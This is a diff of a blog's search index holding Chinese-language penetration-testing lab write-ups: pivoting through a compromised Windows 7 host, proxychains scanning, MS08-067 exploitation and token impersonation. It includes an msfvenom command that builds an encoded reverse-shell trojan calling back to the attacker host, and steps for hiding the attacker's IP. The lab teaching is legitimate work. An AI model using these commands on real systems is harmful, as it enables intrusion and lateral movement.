@@ -1,27 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Pivoting跳板攻击与自动路由</title>
-    <url>/2021/03/21/Pivoting%E8%B7%B3%E6%9D%BF%E6%94%BB%E5%87%BB%E4%B8%8E%E8%87%AA%E5%8A%A8%E8%B7%AF%E7%94%B1/</url>
-    <content><![CDATA[<h2 id="网络拓扑图及通信原理"><a href="#网络拓扑图及通信原理" class="headerlink" title="网络拓扑图及通信原理"></a>网络拓扑图及通信原理</h2><p>我们现在假若得到了<code>192.168.103.101</code>的主机权限，但是我们经过收集信息发现只有该win7主机是出网的，里面还有一个网段的主机不出网，那么这时我们就要使用跳板攻击的方式访问到不出网的主机。这里我们假设出网的网段为<code>192.168.103.0/24</code>，不出网的数据库主机所处网段为<code>192.168.104.0/24</code>，我们在vmware上分别设置好这两个网段。<br><img src="https://img-blog.csdnimg.cn/20210321120638928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>vmnet2之前上一章已经配置完成，vmnet3设置DHCP配置<br><img src="https://img-blog.csdnimg.cn/20210321121040583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<span id="more"></span>
-<p><strong>win7</strong><br><img src="https://img-blog.csdnimg.cn/20210321121411556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><strong>windows server2003</strong><br><img src="https://img-blog.csdnimg.cn/20210321121359809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<!--more-->
-<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>现在我们在kali上生成一个木马文件，然后使用win7下载到本机上，使用管理员的权限运行该文件。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.101.63(这是kali的NAT映射到外网的IP) lport=4444 -b <span class="string">&quot;\x00\xff&quot;</span> -a x86 --platform windows -e x86/shikata_ga_nai -f exe &gt; msf.exe</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210321121742286.png" alt="在这里插入图片描述"><br>然后在kali上开启一个HTTP服务，使用win7下载到本机上</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 4444</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210321122221783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>kali上使用<code>windows/meterpreter/reverse_tcp</code>这个漏洞利用模块，其他操作不再赘述<br><img src="https://img-blog.csdnimg.cn/20210321122504738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进一步提权<br><img src="https://img-blog.csdnimg.cn/20210321122804150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们在meterpreter上使用<code>ipconfig</code>这个命令时，发现了两个网段的IP地址，初步判断有可能是内网敏感数据所处的IP网段<br><img src="https://img-blog.csdnimg.cn/20210321122928633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/202103211229485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不说废话，立马开干！首先使用<code>post/windows/gather/arp_scanner</code>模块对内网信息进行收集<br><img src="https://img-blog.csdnimg.cn/20210321123103614.png" alt="在这里插入图片描述"><br>然后使用自动路由的方式，将<code>192.168.104.0/24</code>这个网段添加到路由表中<br><img src="https://img-blog.csdnimg.cn/20210321123256486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后将会话拉入后台中，接着我们使用<code>auxiliary/scanner/portscan/tcp</code>这个模块扫描主机开放了哪些端口和服务。这里我们就选了几个常用的端口<br><img src="https://img-blog.csdnimg.cn/20210321123522805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>收集完成！<br><img src="https://img-blog.csdnimg.cn/2021032112354091.png" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>红蓝对抗</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Google高级运算符</title>
     <url>/2021/03/21/Google%E9%AB%98%E7%BA%A7%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
     <content><![CDATA[<h2 id="高级运算符"><a href="#高级运算符" class="headerlink" title="高级运算符"></a>高级运算符</h2><blockquote>
@@ -93,6 +72,27 @@
       </categories>
       <tags>
         <tag>Google hacking</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pivoting跳板攻击与自动路由</title>
+    <url>/2021/03/21/Pivoting%E8%B7%B3%E6%9D%BF%E6%94%BB%E5%87%BB%E4%B8%8E%E8%87%AA%E5%8A%A8%E8%B7%AF%E7%94%B1/</url>
+    <content><![CDATA[<h2 id="网络拓扑图及通信原理"><a href="#网络拓扑图及通信原理" class="headerlink" title="网络拓扑图及通信原理"></a>网络拓扑图及通信原理</h2><p>我们现在假若得到了<code>192.168.103.101</code>的主机权限，但是我们经过收集信息发现只有该win7主机是出网的，里面还有一个网段的主机不出网，那么这时我们就要使用跳板攻击的方式访问到不出网的主机。这里我们假设出网的网段为<code>192.168.103.0/24</code>，不出网的数据库主机所处网段为<code>192.168.104.0/24</code>，我们在vmware上分别设置好这两个网段。<br><img src="https://img-blog.csdnimg.cn/20210321120638928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>vmnet2之前上一章已经配置完成，vmnet3设置DHCP配置<br><img src="https://img-blog.csdnimg.cn/20210321121040583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<span id="more"></span>
+<p><strong>win7</strong><br><img src="https://img-blog.csdnimg.cn/20210321121411556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><strong>windows server2003</strong><br><img src="https://img-blog.csdnimg.cn/20210321121359809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<!--more-->
+<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>现在我们在kali上生成一个木马文件，然后使用win7下载到本机上，使用管理员的权限运行该文件。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.101.63(这是kali的NAT映射到外网的IP) lport=4444 -b <span class="string">&quot;\x00\xff&quot;</span> -a x86 --platform windows -e x86/shikata_ga_nai -f exe &gt; msf.exe</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210321121742286.png" alt="在这里插入图片描述"><br>然后在kali上开启一个HTTP服务，使用win7下载到本机上</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 4444</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210321122221783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>kali上使用<code>windows/meterpreter/reverse_tcp</code>这个漏洞利用模块，其他操作不再赘述<br><img src="https://img-blog.csdnimg.cn/20210321122504738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进一步提权<br><img src="https://img-blog.csdnimg.cn/20210321122804150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们在meterpreter上使用<code>ipconfig</code>这个命令时，发现了两个网段的IP地址，初步判断有可能是内网敏感数据所处的IP网段<br><img src="https://img-blog.csdnimg.cn/20210321122928633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/202103211229485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不说废话，立马开干！首先使用<code>post/windows/gather/arp_scanner</code>模块对内网信息进行收集<br><img src="https://img-blog.csdnimg.cn/20210321123103614.png" alt="在这里插入图片描述"><br>然后使用自动路由的方式，将<code>192.168.104.0/24</code>这个网段添加到路由表中<br><img src="https://img-blog.csdnimg.cn/20210321123256486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后将会话拉入后台中，接着我们使用<code>auxiliary/scanner/portscan/tcp</code>这个模块扫描主机开放了哪些端口和服务。这里我们就选了几个常用的端口<br><img src="https://img-blog.csdnimg.cn/20210321123522805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>收集完成！<br><img src="https://img-blog.csdnimg.cn/2021032112354091.png" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>红蓝对抗</tag>
       </tags>
   </entry>
   <entry>
@@ -203,26 +203,6 @@
       </tags>
   </entry>
   <entry>
-    <title>proxychains代理扫描并获取内网服务器权限</title>
-    <url>/2021/03/25/proxychains%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F%E5%B9%B6%E8%8E%B7%E5%8F%96%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90/</url>
-    <content><![CDATA[<h2 id="Proxychains"><a href="#Proxychains" class="headerlink" title="Proxychains"></a>Proxychains</h2><p>Proxychains是为了GNU\Linux操作系统而开发的工具，任何TCP连接都可以通过TOR或者SOCKS4，SOCKS5，HTTP/HTTPS路由到目的地。在这个通道技术中可以使用多个代理服务器。除此之外提供匿名方式，诸如用于中转跳板的应用程序也可以用于对发现的新网络进行直接通信。</p>
-<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>还是这个拓扑图，我们穿越了层层障碍，终于拿到了<code>192.168.103.101</code>这台服务器的权限，接下来，我们以这台服务器为跳板机，去访问内网中的更多机器。而proxychains则是隐藏我们本机kali对目标服务器之间的流量，从而加大被溯源的成本。在真实的渗透中可能不止一台数据库机器，横向的时候可能会出现多台域主机。<br><img src="https://img-blog.csdnimg.cn/20210325101439326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>首先我们先拿下win7这台主机的权限，我们使用上次生成的木马进行连接shell</p>
-<span id="more"></span>
-<p><img src="https://img-blog.csdnimg.cn/20210325102402822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210325102521265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们先打印一下路由表信息，发现啥也没有<br><img src="https://img-blog.csdnimg.cn/20210325102734146.png" alt="在这里插入图片描述"><br>运行脚本文件，自动将搜集到的网段加入到自动路由表中，这步很重要，将直接影响到后期proxychains执行的效果<br><img src="https://img-blog.csdnimg.cn/20210325102915321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来我们将使用大名鼎鼎的<code>socks4a</code>模块，在后台开启一个代理服务<br><img src="https://img-blog.csdnimg.cn/20210325103248514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<!--more-->
-<p>在上述工作全部顺利完成后，我们就要去配置我们的proxychains配置文件了，路径为<code>/etc/proxychains.conf</code><br><img src="https://img-blog.csdnimg.cn/20210325103548413.png" alt="在这里插入图片描述"><br>保存退出后，我们将使用proxychains加nmap进行主机的漏洞扫描，这里因为我查过文章知道，windows server2003存在缓冲区溢出这个漏洞，因此我直接针对这个漏洞展开扫描，执行的扫描命令为<code>proxychains nmap -sT -sV -Pn -n -p22,135,139,445 --script=smb-vuln-ms08-067.nse 192.168.104.128</code>，最后的IP地址为横向后的主机IP</p>
-<p><img src="https://img-blog.csdnimg.cn/20210325104557700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210325104629217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>当我们判断出系统确实存在这个漏洞之后，我们就返回msf对这个漏洞进行进一步的利用，这里强调一点就是，我们不能再使用反弹shell的payload了，因为我们的主机能访问目标机，但是目标机不能访问我们的本机，所以这里要设置一个直连shell的payload<br><img src="https://img-blog.csdnimg.cn/20210325105533753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>至此，我们又拿下了内网中的另一台机器(假如是数据库)<br><img src="https://img-blog.csdnimg.cn/20210325110028851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>为了验证我们的流量还有真实IP是否得到真实的隐藏，我们中间再插入一台新的主机，里面使用wireshark对流量数据包进行监听，网段设置一定要和内网数据库主机(<code>104</code>网段)的主机一致。<br><img src="https://img-blog.csdnimg.cn/20210325110645479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们在win7的那个meterpreter上执行arp扫描，在上面一台主机上观察数据包的流量变化<br><img src="https://img-blog.csdnimg.cn/20210325111454791.png" alt="在这里插入图片描述"><br>可以看到，都是win7和win2003主机之间的通信，我们真实的主机IP得到了很好的隐藏<br><img src="https://img-blog.csdnimg.cn/20210325111539446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>红蓝对抗</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Redis未授权访问漏洞</title>
     <url>/2021/02/24/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>Redis是一种使用ANSIC语言编写的开源Key-Value型数据库。Redis为了保证效率，将数据缓存在内存中，周期性地把更新的数据写入磁盘或者把修改操作写入追加的记录文件中，在此基础上实现了master-slave(主从)同步。</p>
@@ -261,24 +241,17 @@
       </tags>
   </entry>
   <entry>
-    <title>令牌假冒</title>
-    <url>/2021/03/21/%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/</url>
-    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>假冒令牌可以假冒一个网络中的另一个用户进行各种操作。令牌包括登录会话的安全信息，如用户身份识别、用户组合用户权限。当一个用户登录Windows系统时，它被给定一个访问令牌作为它认证会话的一部分。例如，一个入侵用户可能需要以域管理员处理一个特定任务，当它使用令牌便可假冒域管理员进行工作。</p>
-<h2 id="Windows安全相关概念"><a href="#Windows安全相关概念" class="headerlink" title="Windows安全相关概念"></a>Windows安全相关概念</h2><ul>
-<li>Session</li>
-<li>Windows Station</li>
-<li>Desktop</li>
-<li>Login Session：不同账号登录产生不同的登录Session，代表不同的账号权限</li>
-</ul>
-<h2 id="Tokens"><a href="#Tokens" class="headerlink" title="Tokens"></a>Tokens</h2><ul>
-<li>Tokens与进程相关联，进程创建时根据Login Session分配对应Token，含有该进程用户账号、组信息、权限信息等。</li>
-<li>用户每次登录，产生Login Session分配对应Token</li>
-<li>访问资源时提交Token进行身份验证，类似于Web Cookie</li>
-<li>Delegate Token：交互登录会话</li>
-<li>Impersonate Token：非交互登录会话<span id="more"></span>
-<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2>首先我们得构造一个域环境，这里我已经搭建完成了，不懂的小伙伴请自行百度。然后我们关闭Windows XP的防火墙，利用经典的缓冲区溢出漏洞<code>MS08_067</code>漏洞获取shell。<br><img src="https://img-blog.csdnimg.cn/20210319230852823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><!--more-->
-加载<code>Incognito</code>模块，重要的是<code>impersonate_token</code>和<code>list_tokens</code>这两个模块，前者是伪造域管理员或者更高权限的令牌，后者是列出当前计算机都有哪些计算机访问过留下的token值<br><img src="https://img-blog.csdnimg.cn/20210319231232492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021031923145549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们尝试使用域控用共享的方式访问XP主机的C盘<br><img src="https://img-blog.csdnimg.cn/20210319231602521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功捕获到域管理员的令牌<br><img src="https://img-blog.csdnimg.cn/20210319231704464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后使用<code>impersonate_token</code>命令假冒域管理员，因为单斜杠会被转义，所以要换成双斜杠，可以看到我们当前的权限变为域管理员权限<br><img src="https://img-blog.csdnimg.cn/20210319231835906.png" alt="在这里插入图片描述"><br>然后我们就能进入shell执行各种恶意操作了<br><img src="https://img-blog.csdnimg.cn/20210319232030942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
-</ul>
+    <title>proxychains代理扫描并获取内网服务器权限</title>
+    <url>/2021/03/25/proxychains%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F%E5%B9%B6%E8%8E%B7%E5%8F%96%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90/</url>
+    <content><![CDATA[<h2 id="Proxychains"><a href="#Proxychains" class="headerlink" title="Proxychains"></a>Proxychains</h2><p>Proxychains是为了GNU\Linux操作系统而开发的工具，任何TCP连接都可以通过TOR或者SOCKS4，SOCKS5，HTTP/HTTPS路由到目的地。在这个通道技术中可以使用多个代理服务器。除此之外提供匿名方式，诸如用于中转跳板的应用程序也可以用于对发现的新网络进行直接通信。</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>还是这个拓扑图，我们穿越了层层障碍，终于拿到了<code>192.168.103.101</code>这台服务器的权限，接下来，我们以这台服务器为跳板机，去访问内网中的更多机器。而proxychains则是隐藏我们本机kali对目标服务器之间的流量，从而加大被溯源的成本。在真实的渗透中可能不止一台数据库机器，横向的时候可能会出现多台域主机。<br><img src="https://img-blog.csdnimg.cn/20210325101439326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>首先我们先拿下win7这台主机的权限，我们使用上次生成的木马进行连接shell</p>
+<span id="more"></span>
+<p><img src="https://img-blog.csdnimg.cn/20210325102402822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210325102521265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们先打印一下路由表信息，发现啥也没有<br><img src="https://img-blog.csdnimg.cn/20210325102734146.png" alt="在这里插入图片描述"><br>运行脚本文件，自动将搜集到的网段加入到自动路由表中，这步很重要，将直接影响到后期proxychains执行的效果<br><img src="https://img-blog.csdnimg.cn/20210325102915321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来我们将使用大名鼎鼎的<code>socks4a</code>模块，在后台开启一个代理服务<br><img src="https://img-blog.csdnimg.cn/20210325103248514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<!--more-->
+<p>在上述工作全部顺利完成后，我们就要去配置我们的proxychains配置文件了，路径为<code>/etc/proxychains.conf</code><br><img src="https://img-blog.csdnimg.cn/20210325103548413.png" alt="在这里插入图片描述"><br>保存退出后，我们将使用proxychains加nmap进行主机的漏洞扫描，这里因为我查过文章知道，windows server2003存在缓冲区溢出这个漏洞，因此我直接针对这个漏洞展开扫描，执行的扫描命令为<code>proxychains nmap -sT -sV -Pn -n -p22,135,139,445 --script=smb-vuln-ms08-067.nse 192.168.104.128</code>，最后的IP地址为横向后的主机IP</p>
+<p><img src="https://img-blog.csdnimg.cn/20210325104557700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210325104629217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>当我们判断出系统确实存在这个漏洞之后，我们就返回msf对这个漏洞进行进一步的利用，这里强调一点就是，我们不能再使用反弹shell的payload了，因为我们的主机能访问目标机，但是目标机不能访问我们的本机，所以这里要设置一个直连shell的payload<br><img src="https://img-blog.csdnimg.cn/20210325105533753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>至此，我们又拿下了内网中的另一台机器(假如是数据库)<br><img src="https://img-blog.csdnimg.cn/20210325110028851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
